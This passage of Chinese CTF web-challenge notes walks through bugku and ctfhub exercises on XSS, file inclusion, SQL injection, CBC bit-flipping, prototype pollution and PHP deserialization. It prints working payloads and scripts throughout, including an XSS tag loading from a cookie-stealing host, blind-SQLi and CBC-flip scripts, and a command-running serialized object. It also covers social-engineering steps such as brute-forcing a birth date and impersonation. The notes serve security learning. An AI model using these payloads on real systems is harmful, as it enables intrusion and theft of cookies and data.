接着进入`.hg/store/fncache`可以看到flag的文件名`flag_2420924647.txt`，访问即可得到flag。

方法：curl IP/flag_2420924647.txt



**11.XSS攻击**

**例1：[源代码---bugku]：**

<img src="E:\Study\渗透分析和漏洞测试\CTF题解\Picture\31.png" alt="12" style="zoom:150%;" />

F12查看后发现其中隐藏了script脚本代码，其中包含了大量%的文本，猜测是URL编码后的字符串。

通过URL解密器解密后，得到：

```js
var p1 = function checkSubmit(){var a=document.getElementById("password");if("undefined"!=typeof a){if("67d709b2b
var p2 = aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1}}document.getElementById("levelQuest").onsubmit=checkSubmit;
eval(unescape(p1) + unescape("54aa2") + p2)
//由此可以得出，需要提交的值合并的这一段字符
67d709b2b54aa2aa648cf6e87a7114f1
```

<img src="E:\Study\渗透分析和漏洞测试\CTF题解\Picture\32.png" alt="12" style="zoom:100%;" />

**例2：[反射型---ctfhub]：**

初始界面是两个表单，在第一个表单输入并提交`<scirpt>alert(1)</script`时，会被html正常解析执行弹窗，第二个表单指的是将 xss 代码发送到后台的bot进行攻击(模拟管理员点击了恶意xss链接盗取cookie)。

首先需要一个获取cookie的平台，https://xss.pt/，创建项目后，获得 js 代码。

```js
<sCRiPt sRC=//xss.pt/th7l></sCrIpT>
```

接着将其进行URL编码后，拼接上页面的URL，在第二个表单进行提交。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\91.png)

然后在xss平台可以获得 cookie 信息，里面包含 flag 值。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\92.png)



**12.文件包含漏洞**

**例1：[文件包含--bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\33.png)

F12后可以看到一个a标签，跳转的内容为`./index.php?file=show.php`，可以联想到文件包含漏洞：用户可以控制包含的文件名，从而导致信息泄露和getshell。

一般的解决方法是**利用封装协议(伪协议)读源码**：`?file=php://filter/read=convert.base64-encode/resource=index.php`，查看php文件的源码。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\34.png)

得到一串Base64加密后的php源码，解密后在注释中找到flag。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\35.png)

**例2：[file_get_contents--bugku]：**

初始界面是一串PHP代码：

```php
<?php
extract($_GET); #extract($_GET)表示将输入的字符串作为变量，本题表示输入ac
if (!empty($ac))
{
$f = trim(file_get_contents($fn)); #file_get_contents()函数表示读取文件内容输出
if ($ac === $f) 
{
echo "<p>This is flag:" ." $flag</p>";
}
else
{
echo "<p>sorry!</p>";
}
}
?>
```

分析代码，需要传入一个变量ac和一个文件fn，这时可以用到php伪协议：php://input，作用是可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。

可以构造payload为?ac=1&fn=php://input

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\68.png)



**13.SQL注入漏洞**

**例1：[成绩搜集--bugku]：**

初始界面是一个按钮提交表单，输入数字1,2,3...获得对应学生的成绩，尝试后发现4以上的数字不显示成绩。因此，要想方法获得数据库的所有信息。

首先获得数据库的名称，使用联合查询的方式进行SQL注入。

`id=a' union select 1,2,3,database()#`：id=a'的目的是闭合前一个查询，并使其无效。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\50.png)

数据库名为skctf，接着查询表名：`id=a' union select 1,2,3,concat(table_name) from information_schema.tables where table_schema='skctf'#`，表名为fl4g。

最后查询列名：`id=a' union select 1,2,3,concat(column_name) from information_schema.columns where table_name='fl4g'`，列名为skctf_flag

最后查询对应的值：`id=a' union select 1,2,3,skctf_flag from fl4g#`

**例2：[login1--bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\67.png)

首先随便注册一个账号并登录成功后，页面显示管理员身份登录才能看到flag的值。结合题目中的提示SQL约束攻击，可以猜测管理员的用户名。

**SQL约束攻击**：在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的。

因此SQL约束方式，简单理解就是可以用增添字符的方式，伪造成管理员用户。本题猜测管理员的用户名为`admin`，因此注册账号时用户名为`admin`后面随便加几个空格，密码随意。登录成功就可伪造成管理员登录了。

**例3：[login2---bugku]：**

本题是login1题目的扩展，初始界面类似，区别是不能注册账号，通过burp抓包，重放请求后收到的request中包含有一个字段`tip: JHNxbD0iU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gYWRtaW4gV0hFUkUgdXNlcm5hbWU9JyIuJHVzZXJuYW1lLiInIjsKaWYgKCFlbXB0eSgkcm93KSAmJiAkcm93WydwYXNzd29yZCddPT09bWQ1KCRwYXNzd29yZCkpewp9`，通过base64解密后得到一串代码：

```php
$sql="SELECT username,password FROM admin WHERE username='".$username."'";
if (!empty($row) && $row['password']===md5($password)){
}
```

分析代码，大致含义是要求SQL注入绕过username，然后输入的password的值要和md5加密后的一致。因此采用联合查询的方式。payload：username=admin' union select 1,md5(123)#&password=123。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\77.png)

可以看到成功绕过了前端登录页面，进入了后台。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\78.png)

接着输入命令想要获取更多的信息，发现很多命令都被过滤了。

方法：采用**管道绕过**的方式。输入命令：123|cat /flag > test(意思是将flag的值存放到test目录下)

**例4：[sql注入---bugku]：**

初始界面是一个用户名和密码的登录界面，题目中给的提示是**布尔盲注**，首先测试发现过滤了很多字符，比如说空格、逗号、and以及等号，因此传统的布尔盲注的方式不适用了。

空格可以用括号代替，等号可以用<>(不等号)代替，and可用or或者^代替。具体方法如下python脚本。

```python
#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。
import requests
import string,hashlib
url = 'http://114.67.246.176:19665/'
sss = string.digits + (string.ascii_lowercase)
a = ''
for i in range(1, 50):
    flag = 0
    for j in sss:
        payload = "admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#" % (i, ord(j))
        #屏蔽了","，改用mid()函数，from表示起始位置
        #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit
        #<>表示不等号
        #^表示异或
        payload2= "admin123'or((ascii(mid((select(password)from(admin))from(%s))))<>%s)#"%(i,ord(j))
        #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔
        payload3= "admin123'or((ascii(mid((select(database()))from(%s))))<>%s)#"%(i,ord(j))
        
        data = {'username': payload, 'password': 'admin'}
        res = requests.post(url, data=data).text
        if 'username does not exist!' in res:
            a += j
            flag = 1
            print(a)
            break
    if flag == 0:
        break
 
print(a)
```

得到一串md5加密后的字符串，解密后得到登录密码bugkuctf。

**例5：[CBC---bugku]：**

和login2题目类似，初始界面仍为一个用户名和密码的登录界面，首先扫描敏感目录文件，发现了一个.index.php.swp文件。

然后将swp文件恢复，方法：vi -r {your file name}，获取本题的代码。

```php+HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">;
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Login Form</title>
<link href="static/css/style.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="static/js/jquery.min.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    $(".username").focus(function() {
        $(".user-icon").css("left","-48px");
    });
    $(".username").blur(function() {
        $(".user-icon").css("left","0px");
    });
    $(".password").focus(function() {
        $(".pass-icon").css("left","-48px");
    });
    $(".password").blur(function() {
        $(".pass-icon").css("left","0px");
    });
});
</script>
</head>
<?php
define("SECRET_KEY", file_get_contents('/root/key'));
define("METHOD", "aes-128-cbc");
session_start();
function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}
function login($info){
    $iv = get_random_iv();
    $plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    $_SESSION['username'] = $info['username'];
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}
function check_login(){
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");
        }
    }
}
function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo '<p>Hello admin</p>';
        echo '<p>Flag is $flag</p>';
    }else{
        echo '<p>hello '.$_SESSION['username'].'</p>';
        echo '<p>Only admin can see flag</p>';
    }
    echo '<p><a href="loginout.php">Log out</a></p>';
}
if(isset($_POST['username']) && isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('<p>admin are not allowed to login</p>');
    }else{
        $info = array('username'=>$username,'password'=>$password);
        login($info);
        show_homepage();
    }
}else{
    if(isset($_SESSION["username"])){
        check_login();
        show_homepage();
    }else{
        echo '<body class="login-body">
                <div id="wrapper">
                    <div class="user-icon"></div>
                    <div class="pass-icon"></div>
                    <form name="login-form" class="login-form" action="" method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>
                        </div>
                        <div class="content">
                        <input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" />
                        <input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" />
                        </div>
                        <div class="footer">
                        <input type="submit" name="submit" value="Login" class="button" />
                        </div>
                    </form>
                </div>
            </body>';
    }
}
?>
</html>
```

代码比较长，静下心来慢慢分析。程序接收到POST参数(username,password)，并且禁止admin登陆。当用户名不是admin的时候，首先把用户名密码放入数组，传到login方法中。login方法对传入的数组进行了序列化，并且使用aes-128-cbc对序列化进行加密。iv(初始化向量)是随机生成的。最终把cipher和iv放入cookie。

在show_homepage()方法中提到，$_SESSION中的username是admin时，打印flag。

接下来，先用非admin用户登录，并用burp抓包看看效果。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\79.png)

知识点：

**CBC翻转攻击：**通过损坏密文字节来改变明文字节，借由此可以绕过过滤器，或者改变用户权限提升至管理员。

CBC加密涉及到的变量：

- Plaintext：待加密的数据。
- IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。
- Ciphertext：加密后的数据。

加密过程：

1. 首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。

2. 生成一个随机的初始化向量(IV)和一个密钥。
3. 将IV和第一组明文异或。
4. 用密钥对3中xor后产生的密文加密。
5. 用4中产生的密文对第二组明文进行xor操作。
6. 用密钥对5中产生的密文加密。
7. 重复4-7，到最后一组明文。
8. 将IV和加密后的密文拼接在一起，得到最终的密文。

因此，CBC加密的特点：**前一块的密文用来产生后一块的密文。**同样的，解密的特点：**前一块密文参与下一块密文的还原。**

**CBC翻转攻击的方式**：前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。

本题中用到在burp抓包中可以看到cookie中的IV变量和Cipher变量，我们需要对Cipher变量进行翻转。

```python
import base64
import requests
import urllib.parse
iv_raw='gq7uWKx7NIBTZrdFNZyOdw%3D%3D'  #这里填写第一次返回的iv值
cipher_raw='Mz%2BUhIeYM1WQXkSNlzGPQ6i%2FFazCPAN1HK2zw4uXX4lgPCEofdvowp362N6Z9EmPK5gSqdP4GfhQNPIg2eJX2g%3D%3D'  #这里填写第一次返回的cipher值
print ("[*]原始iv和cipher")
print ("iv_raw:  " + iv_raw)
print ("cipher_raw:  " + cipher_raw)
print ("[*]对cipher解码，进行反转")
cipher = base64.b64decode(urllib.parse.unquote(cipher_raw))
#a:2:{s:8:"username";s:5:"zdmin";s:8:"password";s:3:"123"}
#a:2:{s:8:"userna  第一个块数据
#me";s:5:"zdmin";  此时需要替换的z在第10位
#s:8:"password";s
#:3:"123";}
xor_cipher = cipher[0:9] +  bytes(chr(cipher[9] ^ ord('z') ^ ord('a')),encoding='utf-8') + cipher[10:]
#chr(cipher[9] ^ ord('z') ^ ord('a'))：这是第一个块里面的东西。简单点讲，解密的时候，chr(ord(cipher[9]) ^ ord('z') ^ ord('a'))现在相当于B的第10位，他要和第二个块密文经过密钥解密之后得到的C的第10位进行异或。最初的ord(cipher[9])和C的第10位异或得到的是ord('z')，而现在，相当于ord('z')^ord('z') ^ ord('a')。即我们得到了我们想要的ord('a')
xor_cipher=urllib.parse.quote(base64.b64encode(xor_cipher))
print ("反转后的cipher：" + xor_cipher)
```

得到翻转后的cipher值后修改post请求，将cipher的值和iv的值放置在cookie中。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\80.png)

Base64解密后发现username已经等于admin了，但是前面有一段乱码，原因：我们修改zdmin为admin的时，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。

```python
import base64
import urllib
cipher = 'lUADCMbJ62mg9CWfAajyqG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ=='#填写提交后所得的无法反序列化密文
iv = 'gq7uWKx7NIBTZrdFNZyOdw%3D%3D'#一开始提交的iv
#cipher = urllib.unquote(cipher)
cipher = base64.b64decode(cipher)
iv = base64.b64decode(urllib.unquote(iv))
newIv = ''
right = 'a:2:{s:8:"userna'#被损坏前正确的明文
for i in range(16):
    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来
print urllib.quote(base64.b64encode(newIv))
```

需要注意的是，上面的代码必须在python2环境下执行。执行后获得新的IV的值，然后重放request请求，获得flag值。



**14.shell**

**例1：[shell--bugku]：**

初始界面啥也没有，F12啥也没有，扫描敏感路径也是啥也没有。此时不要慌，根据出题人的提示，可能需要通过字符串拼接的方式绕过去执行系统命令。

首先要想到system函数，通过构造`?s=system("ls")`调用ls命令查看当前路径。发现存放flag值的txt文件。查看内容即可得到flag的值。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\56.png)





**15.js原型链污染**

**例1：[sodirty--bugku]：**

初始页面只有一个注册的超链接，点击注册跳转到页面显示用户注册成功。但是flag值的位置无所得。使用kali中的dirsearch工具进行扫描，发现/www.zip文件，下载下来发现是js源码。截取部分和flag相关的源码。

```js
var express = require('express');
const setFn = require('set-value');
var router = express.Router();

const Admin = {
    "password":process.env.password?process.env.password:"password"
}

router.post("/getflag", function (req, res, next) {
    if (req.body.password === undefined || req.body.password === req.session.challenger.password){
        res.send("登录失败");
    }else{
        if(req.session.challenger.age > 79){
            res.send("糟老头子坏滴很");
        }
        let key = req.body.key.toString();
        let password = req.body.password.toString();
        if(Admin[key] === password){
            res.send(process.env.flag ? process.env.flag : "flag{test}");
        }else {
            res.send("密码错误，请使用管理员用户名登录.");
        }
    }

});
```

分析源码可以看到，当Admin[key]的值和password值相等时才能输出flag的值。那么如何判断本题的漏洞所在呢？最上方代码中发现set-value，判断存在js原型链污染。

**js原型链污染：**攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。

换句话说，就是修改了一个对象的原型的属性值，那么用该对象的父对象创建一个新对象时，新对象的属性值即发生了改变。

然后Admin[key]需要等于password，其中passwod为我们控制的 而Admin[key] 我们不知道。

因为age是一个已经存在的变量，所以可以用post传参去覆盖。

`data={"attrkey":"age","attrval":"20"} `

`update(url,data)`

```python
#固定脚本
import requests
import random
from bs4 import BeautifulSoup
import re
import base64
s = requests.session() #保持同一个会话
def reg(url):
    url=url+"reg"
    r=s.get(url)
    print(r.text)

def update(url,data):
    url=url+"update"
    print(url)
    r=s.post(url,data=data)
    print(r.text)
def getflag(url,data):
    url=url+"getflag"
    r=s.post(url,data=data)
    print(r.text)

url="http://114.67.175.224:17737/"
reg(url)
data={"attrkey":"age","attrval":"20"}
update(url,data)
data={"attrkey":"__proto__.pwd","attrval":"123"}
update(url,data)
data={"password":"123","key":"pwd"}
getflag(url,data)
```

最后获得flag的值。



**16.正则语法**

**例1：[字符？正则？--bugku]：**

初始页面是一串PHP代码：

```php
 <?php 
highlight_file('2.php');
$key='flag{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){ 
  die('key is: '.$key);
}
?> 
```

题目很简单，只要在IP地址之后添加`?id=`值满足正则的要求就行

正则的详细语法：

- **定界符：**/和/，/i表示不区分大小写。
- **. （一个点）：**表示可以匹配任何字符。
- ***  ：**前面的字符重复零次或多次。
- **{n,m} ：**前面的字符重复n~m次。
- **\ （反斜线）：**后面的字符被转义。
- **[a-z] ：**在a到z中匹配 。
- **[[:punct:]] ：**匹配任何标点符号。

因此这题可以构造id=`keykey1234key:/1/keya;`



**17.序列化和反序列化**

**例1：[安慰奖--bugku]：**

初始界面为空界面，F12可以看到注释中存在` YmFja3Vwcw== `，base64解密得到backups，指备份。接着通过敏感目录扫描发现备份文件/index.php.bak，下载到本地获得源码。

```php
<?php

header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
echo "<!-- YmFja3Vwcw== -->";
class ctf
{
    protected $username = 'hack';
    protected $cmd = 'NULL';
    public function __construct($username,$cmd)
    {
        $this->username = $username;
        $this->cmd = $cmd;
    }
    function __wakeup()
    {
        $this->username = 'guest';
    }

    function __destruct()
    {
        if(preg_match("/cat|more|tail|less|head|curl|nc|strings|sort|echo/i", $this->cmd))
        {
            exit('</br>flag能让你这么容易拿到吗？<br>');
        }
        if ($this->username === 'admin')
        {
           // echo "<br>right!<br>";
            $a = `$this->cmd`;
            var_dump($a);
        }else
        {
            echo "</br>给你个安慰奖吧，hhh！</br>";
            die();
        }
    }
}
    $select = $_GET['code'];
    $res=unserialize(@$select);
?>

```

粗略浏览代码，发现主要需要传入序列化的参数code，code中需要包含username和cmd，cmd限制了一些Linux中的查看文件的命令,username的值则需要等于admin。

此时看到`__wakeup()`函数中，username=guest，联想到需要**绕过`__wakeup()`函数**。

知识点引入：

- 当序列化字符串表示对象属性**个数**的值**大于**真实个数的属性时就会跳过__wakeup的执行。
- Linux中的tac命令：将文件从最后一行开始倒过来将内容数据输出到屏幕上。就是和cat命令相反。
- 构造序列化对象时：
  - private属性序列化格式：%00类名%00成员名
  - protected属性序列化格式：%00*%00成员名

接下来开始构造本题的序列化对象：

```php
O:3:"ctf":3:{s:11:"%00*%00username":s:5:"admin":s:6:"%00*%00cmd":s:12:"tac flag.php";}

//解析：
//O：代表对象(object)，表示序列化一个对象，序列化数组则用A表示
//3：代表类名字的长度
//ctf：类名
//3：代表三个属性，因为需要绕过__wakeup()函数，比实际属性个数2大就行
//s：代表字符串
//11：代表属性名长度
//username：代表属性名
//s:5:"admin" 字符串 属性值长度 属性值
//注意：不要用hackbar传入数据，直接在URL中传入
```

**例2：[点login咋没反应--bugku]：**

初始界面是一个username、password文本框和login按钮的表单，随便输一个账号密码，点击login按钮无反应。F12发现一个admin.css文件，内容如下：

```css
/* try ?20430 */
body {
    background-color: #C1DEE8;
}

p { margin: 20px 0 0; }

.container {
    background-color: #ffffff;
    border-radius: 10px;
    width: 20%;
    height: 20%;
    margin: 10% auto;
    padding: 30px;
}

input[type=text], input[type=password] {
    width: 100%;
    height: 40px;
}

input[type=button] {
    width: 60%;
    height: 40px;
    border-radius: 20px;
}
```

其中，第一行给了提示，访问当前路径下的?20430可以获得php源码

```php
<?php
error_reporting(0);
$KEY='ctf.bugku.com';
include_once("flag.php");
$cookie = $_COOKIE['BUGKU'];
if(isset($_GET['20430'])){
    show_source(__FILE__);
}
elseif (unserialize($cookie) === "$KEY")
{   
    echo "$flag";
}
?>
```

分析代码，发现需要在请求中设置Cookie，BUGKU参数的值要求等于$KEY值的序列化后的结果，借助PHP在线工具，获得序列化后的值

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\74.png)

此时，通过burp，重放请求，增加 Cookie: BUGKU=s:13:"ctf.bugku.com"; 即可得到flag值。

**例3：[newphp--bugku]：**

初始界面是一串php代码，代码如下：

```php
<?php
// php版本:5.4.44
header("Content-type: text/html; charset=utf-8");
highlight_file(__FILE__);

class evil{
    public $hint;

    public function __construct($hint){
        $this->hint = $hint;
    }

    public function __destruct(){
    if($this->hint==="hint.php")
            @$this->hint = base64_encode(file_get_contents($this->hint)); 
        var_dump($this->hint);
    }

    function __wakeup() { 
        if ($this->hint != "╭(●｀∀´●)╯") { 
            //There's a hint in ./hint.php
            $this->hint = "╰(●’◡’●)╮"; 
        } 
    }
}

class User
{
    public $username;
    public $password;

    public function __construct($username, $password){
        $this->username = $username;
        $this->password = $password;
    }

}

function write($data){
    global $tmp;
    $data = str_replace(chr(0).'*'.chr(0), '\0\0\0', $data);
    $tmp = $data;
}

function read(){
    global $tmp;
    $data = $tmp;
    $r = str_replace('\0\0\0', chr(0).'*'.chr(0), $data);
    return $r;
}

$tmp = "test";
$username = $_POST['username'];
$password = $_POST['password'];

$a = serialize(new User($username, $password));
if(preg_match('/flag/is',$a))
    die("NoNoNo!");

unserialize(read(write($a)));

```

分析代码，代码中有两个类，**evil类**中$this->hint指向文件hint.php，说明要构造并出发这个evil类，但是接入点是post进去username和password两个参数，且触发的是**User类**，而User类中有read和write方法，经过处理后进行反序列化。

PHP反序列化特性：

- php在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾，并根据长度判断内容
- php反序列化时对类中不存在的属性也会进行反序列化
- 因此，php在反序列化的时候只要求第一个反序列化字符串块合法即可。
- 比如：a:2:{i:0;s:6:"tr1ple";i:1;s:5:"aaaaa";}i:1;s:5:"aaaaa"; 能被正常反序列化

那什么是字符串逃逸呢？

```php
$a = str_replace('x','zz',$string);
#过滤的规则为x->zz，即注入一个x可以逃逸出一个字符的空位，那么我们只需要注入20个x即可变成40个z，即可逃逸出20个空位，从而将我们的payload变为反序列化后得到的属性值。
```

以本题为例：反序列化读取的时候将会将六位字符\0\0\0替换成三位字符chr(0)*chr(0)，我们要注入的对象为evil，此时username和password的值我们可控，那么我们可以在username中注入\0，来吞掉password的值。

我们要逃逸出发evil类的payload为：`O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}`

User类的触发：`O:4:"User":2:{s:8:"username";s:3:"123";s:8:"password";s:41:"O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}";}`

因此我们需要逃逸的值为：`";s:8:"password";s:41:"`，共23个字符，然后一对`\0\0\0`可以逃逸三个字符，我们就再添一个a进去凑成24个，最终的payload为：

`username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&password=a";s:8:"password";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}`

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\75.png)

得到一串Base64加密的字符串，解密后得到：

```php
<?php
 $hint = "index.cgi";
 // You can't see me~
```

此时需要用到之前学过的知识 view-source查看文件源码。方法：view-source:114.67.175.224:12230/index.cgi

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\76.png)

从url中可以看到get方法可以获取name，因此直接使用file伪协议，直接getflag。方法：

114.67.175.224:12230/index.cgi?name=%20file:///flag



**18.备份文件**

**例1：[vim缓存--ctfhub]：**

初始页面提示flag在文件index.php源码中，在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。

以 index.php 为例：第一次产生的交换文件名为 `.index.php.swp`

再次意外退出后，将会产生名为 `.index.php.swo` 的交换文件

第三次产生的交换文件则为 `.index.php.swn`

解决方法：用 wget 命令将交换文件下载下来。

```
wget http://challenge-5e11a4163c058a15.sandbox.ctfhub.com:10080/.index.php.swp
vim index.php
```

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\83.png)

然后选择 R 进行恢复，即可查看到源码。

**例2：[.DS_Store--ctfhub]：**

.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。

本题可以直接在URL后添加.DS_Store下载文件，打开文件是乱码，从中肉眼观察拼凑出flag所在的txt。

还有一种方式就是通过 Python-dsstore 工具 (https://github.com/gehaxelt/Python-dsstore)来完成 .DS_Store 文件的解析：

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\84.png)



**19.社工(考验综合能力)**

**例1：[社工-初步收集--bugku]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\40.png)

首先扫描观察是否有敏感文件，使用kali中的dirsearch命令进行扫描。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\41.png)

可以看到扫描到一些php文件，进入/admin/index.php界面。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\42.png)

接下来需要获取账号和密码，首页中提供了一个辅助工具sz.zip下载，下载解压后是一个exe文件，通过IDA逆向分析，能力有限，目前还是做不到。于是尝试另一种方法：通过wireshark抓SMTP的包。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\43.png)

base64解密账号和密码，发现密码是邮箱授权码，登录foxmail邮箱(一直显示网络环境风险，登录不上，只能看别人WP了)。

登录进去后发现全被删除了，其中一封邮件中获得了mara的发件人，通过safe6 社工爆破工具爆破出她的出生年为2001-02-06。因此，用户名为mara，密码为20010206。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\44.png)

**例2：[社工-伪造--bugku]：**

初始界面是一个聊天室，需要用QQ号进行登录，随便输入1234567，进入聊天页面，发现只有一个用户在线。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\47.png)

点开小美右上角的空间，进一步获取其男朋友的信息。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\48.png)

发现QQ名称为小bug，联想到题目的要求是伪造，因此，将自己的QQ名称改为小bug，伪造成小美的男朋友，重新登录聊天室，发送flag信息。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\49.png)

**例3：[默认口令--ctfhub]：**

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\89.png)

初始界面如上图所示，一开始以为是用户名密码爆破的题目，但发现验证码每次都在变化，因此不能通过抓包进行爆破。从社工角度思考，观察这个界面是eYou邮件网关，可以联想到去搜索这个网关的默认账号密码。

![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\90.png)

此时通过这三个默认账号登录，即可找到flag值。
